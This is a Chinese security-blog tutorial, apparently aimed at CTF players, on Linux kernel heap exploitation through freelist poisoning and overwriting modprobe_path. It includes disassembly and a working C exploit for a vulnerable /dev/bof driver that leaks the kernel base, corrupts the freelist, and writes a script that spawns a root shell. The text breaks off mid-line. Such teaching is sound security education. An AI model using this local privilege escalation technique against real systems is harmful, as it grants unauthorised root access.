---
title: Linux kernel 堆溢出利用方法（三）
url: https://www.secpulse.com/archives/205676.html
source: 安全脉搏
date: 2024-12-18
fetch_date: 2025-10-06T19:38:15.494868
---

# Linux kernel 堆溢出利用方法（三）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Linux kernel 堆溢出利用方法（三）

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2024-12-17

11,329

## 前言

本文我们通过我们的老朋友`heap_bof`来讲解`Linux kernel`中任意地址申请的其中一种比赛比较常用的利用手法`modprobe_path`（虽然在高版本内核已经不可用了但ctf比赛还是比较常用的）。再通过两道近期比赛的赛题来讲解。

## Arbitrary Address Allocation

### 利用思路

通过 uaf 修改 `object` 的 `free list` 指针实现任意地址分配。与 `glibc` 不同的是，内核的 `slub` 堆管理器缺少检查，因此对要分配的目标地址要求不高，不过有一点需要注意：当我们分配到目标地址时会把目标地址前 `8` 字节的数据会被写入 `freelist`，而这通常并非一个有效的地址，从而导致 `kernel panic`，因此在任意地址分配时最好确保目标 `object` 的 `free list` 字段为 `NULL` 。

当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是 `modprobe_path` 。`modprobe_path` 是内核中的一个变量，其值为 `/sbin/modprobe` ，因此对于缺少符号的内核文件可以通过搜索 `/sbin/modprobe` 字符串的方式定位这个变量。

当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：

```
entry_SYSCALL_64()
    sys_execve()
        do_execve()
            do_execveat_common()
                bprm_execve()
                    exec_binprm()
                        search_binary_handler()
                            __request_module() // wrapped as request_module
                                call_modprobe()
```

其中 `call_modprobe()` 定义于 `kernel/kmod.c`，我们主要关注这部分代码：

```
static int call_modprobe(char *module_name, int wait)
{
    //...
    argv[0] = modprobe_path;
    argv[1] = "-q";
    argv[2] = "--";
    argv[3] = module_name;  /* check free_modprobe_argv() */
    argv[4] = NULL;

    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    if (!info)
        goto free_module_name;

    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
    //...
```

在这里调用了函数 `call_usermodehelper_exec()` 将 `modprobe_path` 作为可执行文件路径以 root 权限将其执行。 我们不难想到的是：若是我们能够劫持 `modprobe_path`，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以 root 权限执行我们的恶意脚本。

或者分析`vmlinux`即可(对于一些没有`call_modprobe()`符号的直接交叉引用即可)。

```
__int64 _request_module(
        char a1,
        __int64 a2,
        double a3,
        double a4,
        double a5,
        double a6,
        double a7,
        double a8,
        double a9,
        double a10,
        ...)
{
......
    if ( v19 )
    {
......
      v21 = call_usermodehelper_setup(
              (__int64)&byte_FFFFFFFF82444700, // modprobe_path
              (__int64)v18,
              (__int64)&off_FFFFFFFF82444620,
              3264,
              0LL,
              (__int64)free_modprobe_argv,
              0LL);
......
}
.data:FFFFFFFF82444700 byte_FFFFFFFF82444700             ; DATA XREF: __request_module:loc_FFFFFFFF8108C6D8↑r
.data:FFFFFFFF82444700                 db 2Fh  ; /       ; __request_module+14B↑o ...
.data:FFFFFFFF82444701                 db  73h ; s
.data:FFFFFFFF82444702                 db  62h ; b
.data:FFFFFFFF82444703                 db  69h ; i
.data:FFFFFFFF82444704                 db  6Eh ; n
.data:FFFFFFFF82444705                 db  2Fh ; /
.data:FFFFFFFF82444706                 db  6Dh ; m
.data:FFFFFFFF82444707                 db  6Fh ; o
.data:FFFFFFFF82444708                 db  64h ; d
.data:FFFFFFFF82444709                 db  70h ; p
.data:FFFFFFFF8244470A                 db  72h ; r
.data:FFFFFFFF8244470B                 db  6Fh ; o
.data:FFFFFFFF8244470C                 db  62h ; b
.data:FFFFFFFF8244470D                 db  65h ; e
.data:FFFFFFFF8244470E                 db    0
```

### exp

```
#include "src/pwn_helper.h"

#define BOF_MALLOC 5
#define BOF_FREE 7
#define BOF_WRITE 8
#define BOF_READ 9

size_t modprobe_path = 0xFFFFFFFF81E48140;
size_t seq_ops_start = 0xffffffff81228d90;

struct param {
    size_t len;
    size_t *buf;
    long long idx;
};

void alloc_buf(int fd, struct param* p)
{
    printf("[+] kmalloc len:%lu idx:%lld\n", p->len, p->idx);
    ioctl(fd, BOF_MALLOC, p);
}

void free_buf(int fd, struct param* p)
{
    printf("[+] kfree len:%lu idx:%lld\n", p->len, p->idx);
    ioctl(fd, BOF_FREE, p);
}

void read_buf(int fd, struct param* p)
{
    printf("[+] copy_to_user len:%lu idx:%lld\n", p->len, p->idx);
    ioctl(fd, BOF_READ, p);
}

void write_buf(int fd, struct param* p)
{
    printf("[+] copy_from_user len:%lu idx:%lld\n", p->len, p->idx);
    ioctl(fd, BOF_WRITE, p);
}

int main()
{
    // len buf idx
    size_t* buf = malloc(0x500);
    struct param p = {0x20, buf, 0};

    printf("[+] user_buf : %p\n", p.buf);
    int bof_fd = open("/dev/bof", O_RDWR);
    if (bof_fd < 0) {
        puts(RED "[-] Failed to open bof." NONE);
        exit(-1);
    }

    printf(YELLOW "[*] try to leak kbase\n" NONE);

    alloc_buf(bof_fd, &p);
    free_buf(bof_fd, &p);

    int seq_fd = open("/proc/self/stat", O_RDONLY);
    read_buf(bof_fd, &p);
    qword_dump("leak seq_ops", buf, 0x20);

    size_t kernel_offset = buf[0] - seq_ops_start;
    printf(YELLOW "[*] kernel_offset %p\n" NONE, (void*)kernel_offset);
    modprobe_path += kernel_offset;
    printf(LIGHT_BLUE "[*] modprobe_path addr : %p\n" NONE, (void*)modprobe_path);

    p.len = 0xa8;
    alloc_buf(bof_fd, &p);
    free_buf(bof_fd, &p);

    read_buf(bof_fd, &p);

    buf[0] = modprobe_path - 0x20;

    write_buf(bof_fd, &p);

    alloc_buf(bof_fd, &p);
    alloc_buf(bof_fd, &p);

    read_buf(bof_fd, &p);
    qword_dump("leak modprobe_path", buf, 0x30);

    strcpy((char *) &buf[4], "/tmp/shell.sh\x00");
    write_buf(bof_fd, &p);
    read_buf(bof_fd, &p);
    qword_dump("leak modprobe_path", buf, 0x30);

    if (open("/shell.sh", O_RDWR) < 0) {
        system("echo '#!/bin/sh' >> /tmp/shell.sh");
        system("echo 'setsid /bin/cttyhack setuidgid 0 /bin/sh' >> /tmp/shell.sh");
        system("chmod +x /tmp/shell.sh");
    }

    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake")...